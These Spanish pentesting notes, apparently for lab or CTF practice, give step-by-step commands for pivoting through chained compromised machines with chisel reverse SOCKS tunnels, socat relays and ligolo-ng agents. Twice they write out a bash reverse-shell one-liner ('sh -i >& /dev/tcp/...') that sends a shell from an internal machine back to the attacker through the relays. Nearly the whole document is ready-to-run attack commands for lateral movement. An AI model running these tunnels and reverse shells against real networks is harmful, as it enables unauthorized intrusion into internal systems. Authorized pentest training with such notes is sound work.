

## Chisel y Socat


```bash
#kali
./chisel server --reverse -p PUERTO_QUE_QUERAMOS
```


```bash
#maquina1
./chisel client IP_KALI:PUERTO_QUE_HEMOS_PUESTO_ANTES R:socks
```


```bash
#MAQUINA1
./socat tcp-l:PUERTO_POR_EL_QUE_QUEREMOS_ESCUCHAR,fork,reuseaddr tcp:IP_KALI:PUERTO_QUE_QUERAMOS

#Kali
nc -nlvp PUERTO_QUE_HAYAMOS_PUESTO
```



---

## Doble pivoting (CHISEL+SOCAT)


***Kali+Máquina1+Máquina2+Máquina3***

### Maquina1 a Maquina2

Nos pasamos chisel a la maquina 1


Una vez lo hayamos pasado, montamos un servidor con chisel en nuestra máquina kali
```bash
#KALI
./chisel server --reverse -p PUERTO_QUE_QUERAMOS
```


Y ahora en la máquina 1 ejecutamos el chisel en modo cliente haciendo que pase por el puerto que hayamos seleccionado previamente, todo el tráfico "remoto" (al redirigir TODO el tráfico, usamos socks, pero podemos especificarle un puerto)
```bash
#MAQUINA1
./chisel client IP_KALI:PUERTO_QUE_HEMOS_PUESTO_ANTES R:socks
```


Configuramos el proxychains
```bash
#KALI
nano /etc/proxychains4.conf

#Al final del archivo lo editamos con el socks que nos dió el comando previo

socks5 127.0.0.1 PUERTO_QUE_SE_HAYA_ASIGNADO
```


Podemos llegar a la máquina 1, pero a la máquina 2 no, entonces usamos socat


Nos pasamos socat a la máquina 1, y ejecutamos socat
```bash
#MAQUINA1
./socat tcp-l:PUERTO_POR_EL_QUE_QUEREMOS_ESCUCHAR1,fork,reuseaddr tcp:IP_KALI:PUERTO_QUE_QUERAMOS

#Kali
nc -nlvp PUERTO_QUE_HAYAMOS_PUESTO
```


Ahora en la máquina 2 si quiero mandarme una revshell he de poner la ip de la máquina que "conecta" la máquina 1 con la 2, no la de kali:

```
kali --> 10.10.10.1
m1 --> 10.10.10.2 y 20.20.20.1 
m2 --> 20.20.20.2 y 30.30.30.1
m3 --> 30.30.30.2
```

Entonces
```bash
#MAQUINA2
sh -i >& /dev/tcp/20.20.20.1/PUERTO_tcp-l_DE_SOCAT 0>&1
```


Ya tendríamos una shell con la máquina 2. Ahora vamos a la máquina 3


### Maquina2 a Maquina3


Nos pasamos chisel y socat a la máquina 2 desde la máquina 1

En la máquina 1, nuevamente deberemos ejecutar socat de nuevo sin quitar el que teníamos previamente, cambiando el puerto final por el que le pusimos al chisel server
```bash
#MAQUINA1
./socat tcp-l:PUERTO_POR_EL_QUE_QUEREMOS_ESCUCHAR2,fork,reuseaddr tcp:IP_KALI:PUERTO_CHISEL_SERVER
```


Ahora deberemos ejecutar chisel en la máquina 2 esta vez a la ip más "cercana" en este caso m1 con un puerto que queramos
```bash
#MAQUINA2
./chisel client IP_MÁS_CERCANA:PUERTO_tcp-l2 R:PUERTO:socks
```

En nuestra máquina kali deberemos configurar de nuevo proxychains
```bash
#KALI
nano /etc/proxychains4.conf

#Al final del archivo lo editamos con el puerto que asignaramos nosotros

socks5 127.0.0.1 PUERTO_QUE_SE_HAYA_ASIGNADO2
socks5 127.0.0.1 PUERTO_QUE_SE_HAYA_ASIGNADO1
```


Volvemos de nuevo con la máquina 1
```bash
#MAQUINA1
./socat tcp-l:PUERTO_POR_EL_QUE_QUEREMOS_ESCUCHAR2,fork,reuseaddr tcp:IP_KALI:PUERTO_QUE_QUERAMOS
```


Ahora nos ponemos con socat en la maquina 2
```bash
#MAQUINA2
./socat tcp-l:PUERTO_POR_EL_QUE_QUEREMOS_ESCUCHAR2,fork,reuseaddr tcp:IP_MAQUINA2:PUERTO_QUE_QUERAMOS
```


En la maquina3
```bash
#MAQUINA3
sh -i >& /dev/tcp/30.30.30.2/PUERTO_tcp-l2 0>&1
```

En nuestra kali
```bash
#KALI
nc -nlvp PUERTO_QUE_HAYAMOS_PUESTO
```

***El método a seguir es prácticamente el mismo con más máquinas***

---


## Ligolo-ng


```bash
#KALI
sudo ip tuntap add user kali mode tun ligolo


sudo ip link set ligolo up
```


Comprobamos que hayamos configurado ligolo bien
```bash
ifconfig

(Deberíamos de ver una red nueva con el nombre que le asignaramos al inicio al tun)
```


Una vez comprobado
```bash
#KALI
sudo ligolo-proxy -selfcert

#Le damos que no a WebUI (no es necesario)
```


Nos pasamos el agente a la máquina1
```bash
#MAQUINA1
./agent -connect IP_KALI:PUERTO_LIGOLO -ignore-cert
```


Podemos ver las sesiones en ligolo, para conectarnos mediante ligolo:
```bash
#KALI
session #Con las flechas podemos seleccionar la sesión

start --tun ligolo
```


En otra terminal de kali
```bash
#KALI
sudo ip route add RED_M1_QUE_NO_LLEGAMOS/24 dev ligolo
```


___


## Doble pivoting (LIGOLO-NG)


***KALI+M1+M2***


```bash
#KALI
sudo ip tuntap add user kali mode tun ligolo


sudo ip link set ligolo up
```


Comprobamos que hayamos configurado ligolo bien
```bash
ifconfig

(Deberíamos de ver una red nueva con el nombre que le asignaramos al inicio al tun)
```


Una vez comprobado
```bash
#KALI
sudo ligolo-proxy -selfcert

#Le damos que no a WebUI (no es necesario)
```


Nos pasamos el agente a la máquina1
```bash
#MAQUINA1
./agent -connect IP_KALI:PUERTO_LIGOLO -ignore-cert
```


Podemos ver las sesiones en ligolo, para conectarnos mediante ligolo:
```ligolo
#KALI
session #Con las flechas podemos seleccionar la sesión

start --tun ligolo
```


En otra terminal de kali
```bash
#KALI
sudo ip route add RED_M1_QUE_NO_LLEGAMOS/24 dev ligolo
```


Una vez hecho lo anterior, volvemos a kali
```bash
#KALI
sudo ip tuntap add user kali mode tun ligolo-segundo

#luego

sudo ip link set ligolo-segundo up
```


En nuestra terminal con ligolo
```ligolo
#KALI
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp

#podemos comprobar los listener con:
listener_list
```


Nos pasamos el agente a la máquina2
```bash
#MAQUINA2
./agent -connect IP_M1:PUERTO_LIGOLO -ignore-cert
```

```bash
#KALI
sudo ip route add RED_M2_QUE_NO_LLEGAMOS/24 dev ligolo-segundo
```


```ligolo
start --tun ligolo-segundo
```